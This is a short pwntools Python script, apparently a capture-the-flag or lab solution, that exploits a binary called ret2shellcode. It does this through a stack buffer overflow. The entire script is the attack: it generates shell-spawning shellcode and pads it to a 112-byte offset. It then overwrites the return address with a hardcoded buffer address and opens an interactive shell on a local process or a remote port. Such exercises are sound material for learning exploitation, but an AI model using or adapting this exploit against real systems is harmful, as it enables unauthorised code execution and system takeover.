#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
local = 1
if local:
	p = process('./ret2shellcode')
else:
	p = remote('127.0.0.1', 8888)
shellcode = asm(shellcraft.sh())
buf_addr = 0x0804a080
offset = 112
p.sendline(shellcode.ljust(112, 'A') + p32(buf_addr))
p.interactive()
